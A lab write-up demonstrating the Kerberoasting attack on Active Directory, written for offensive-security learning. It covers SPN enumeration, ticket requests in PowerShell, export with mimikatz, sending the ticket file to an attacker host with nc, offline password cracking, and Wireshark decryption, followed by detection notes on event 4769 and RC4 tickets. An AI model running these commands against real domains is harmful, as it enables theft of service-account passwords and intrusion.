---
description: Credential Access
---

# Kerberoasting

This lab explores the Kerberoasting attack - it allows any domain user to request kerberos tickets from TGS that are encrypted with NTLM hash of the plaintext password of a domain user account that is used as a service account \(i.e account used for running an IIS service\) and crack them offline avoiding AD account lockouts.

## Execution

Note the vulnerable domain member - a user account with `servicePrincipalName` attribute set, which is very important piece for kerberoasting - only user accounts with that property set are most likely susceptible to kerberoasting:

![](../../.gitbook/assets/kerberoast-principalname.png)

Attacker setting up an nc listener to receive a hash for cracking:

{% code title="attacker@local" %}
```csharp
nc -lvp 443 > kerberoast.bin
```
{% endcode %}

### Extracting the Ticket

Attacker enumerating user accounts with `serverPrincipalName` attribute set:

{% code title="attacker@victim" %}
```csharp
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
```
{% endcode %}

![](../../.gitbook/assets/kerberoast-enumeration.png)

Using only built-in powershell, we can extract the susceptible accounts with:

```csharp
get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
```

![](../../.gitbook/assets/kerberoast-powershell.png)

It would have been better to use the following command provided by [Sean Metcalf](https://adsecurity.org/?p=2293) purely because of the `-filter` usage \(quicker than `select-object`\), but it did not work for me:

```csharp
get-adobject -filter {serviceprincipalname -like “*sql*”} -prop serviceprincipalname
```

Additionally, user accounts with SPN set could be extracted with a native windows binary:

```text
 setspn -T offense -Q */*
```

![](../../.gitbook/assets/kerberoast-setspn%20%281%29.png)

Attacker requesting a kerberos ticket \(TGS\) for a user account with `servicePrincipalName` set to `HTTP/dc-mantvydas.offense.local`- it gets stored in the memory:

{% code title="attacker@victim" %}
```csharp
Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
```
{% endcode %}

![](../../.gitbook/assets/kerberoast-kerberos-token.png)

Using mimikatz, the attacker extracts kerberos ticket from the memory and exports it to a file for cracking:

{% code title="attacker@victim" %}
```csharp
mimikatz # kerberos::list /export
```
{% endcode %}

![](../../.gitbook/assets/kerberoast-exported-kerberos-tickets.png)

Attacker sends the exported service ticket to attacking machine for offline cracking:

{% code title="attacker@victim" %}
```csharp
nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi
```
{% endcode %}

### Cracking the Ticket

Attacker brute forces the password of the service ticket:

{% code title="attacker@local" %}
```csharp
python2 tgsrepcrack.py pwd kerberoast.bin
```
{% endcode %}

![](../../.gitbook/assets/kerberoast-cracked.png)

## Observations

Below is a security log `4769` showing service access being requested:

![](../../.gitbook/assets/kerberoast-4769.png)

If you see `Add-event -AssemblyName SystemIdentityModel` \(from advanced Powershell logging\) followed by a windows security event `4769` immediately after that, you may be looking at an old school Kerberoasting, especially if ticket encryption type has a value `0x17` \(23 decimal, meaning it's RC4 encrypted\):

![](../../.gitbook/assets/kerberoast-logs.png)

### Traffic

Below is the screenshot showing a request being sent to the `Ticket Granting Service` \(TGS\) for the service with a servicePrincipalName `HTTP/dc-mantvydas.offense.local` :

![](../../.gitbook/assets/kerberoast-tgs-req.png)

Below is the response from the TGS for the user `spotless` \(we initiated this attack from offense\spotless\) which contains the encrypted \(RC4\) kerberos ticket \(server part\) to access the `HTTP/dc-mantvydas.offense.local` service. It is the same ticket we cracked earlier with [tgsrepcrack.py](t1208-kerberoasting.md#cracking-the-ticket):

![](../../.gitbook/assets/kerberoast-tgs-res.png)

Out of curiosity, let's decrypt the kerberos ticket since we have the password the ticket was encrypted with. 

Creating a kerberos keytab file for use in wireshark:

{% code title="attacker@local" %}
```bash
root@~# ktutil 
ktutil:  add_entry -password -p HTTP/iis_svc@dc-mantvydas.offense.local -k 1 -e arcfour-hmac-md5
Password for HTTP/iis_svc@dc-mantvydas.offense.local: 
ktutil:  wkt /root/tools/iis.keytab
```
{% endcode %}

![](../../.gitbook/assets/kerberoast-creating-keytab.png)

Adding the keytab to wireshark:

![](../../.gitbook/assets/kerberoast-wireshark-keytab.png)

Note how the ticket's previously encrypted piece is now in plain text and we can see information pertinent to the requested ticket for a service `HTTP/dc-mantvydas.offense.local` :

![](../../.gitbook/assets/kerberoast-decrypted.png)

### tgsrepcrack.py

Looking inside the code and adding a couple of print statements in key areas of the script, we can see that the password from the dictionary \(`Passw0rd`\) initially gets converted into an NTLM \(`K0`\) hash, then another key `K1` is derived from the initial hash and a message type, yet another key `K2` is derived from K1 and an MD5 digest of the encrypted data. Key `K2` is the actual key used to decrypt the encrypted ticket data:

![](../../.gitbook/assets/kerberoast-crackstation.png)

![](../../.gitbook/assets/kerberoast-printstatements.png)

I did not have to, but I also used an online RC4 decryptor tool to confirm the above findings:

![](../../.gitbook/assets/kerberoast-decryptedonline.png)

{% file src="../../.gitbook/assets/kerberoast.pcap" caption="kerberoast.pcap" %}

## References

[Tim Medin - Attacking Kerberos: Kicking the Guard Dog of Hades](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin%281%29.pdf)

{% embed url="https://attack.mitre.org/wiki/Technique/T1208" %}

{% embed url="https://github.com/nidem/kerberoast" %}

{% embed url="https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/" %}

{% embed url="https://adsecurity.org/?p=2293" %}

{% embed url="https://www.youtube.com/watch?v=nJSMJyRNvlM&feature=youtu.be&t=16" %}

{% embed url="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" %}

{% embed url="https://pentestlab.blog/2018/06/12/kerberoast/" %}

{% embed url="https://blog.xpnsec.com/kerberos-attacks-part-1/" %}

{% embed url="https://pentestlab.blog/2018/06/12/kerberoast/" %}

{% embed url="http://rc4.online-domain-tools.com/" %}

{% embed url="https://crackstation.net/" %}

{% embed url="https://blogs.technet.microsoft.com/askds/2008/03/06/kerberos-for-the-busy-admin/" %}

{% embed url="https://medium.com/@jsecurity101/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec" %}

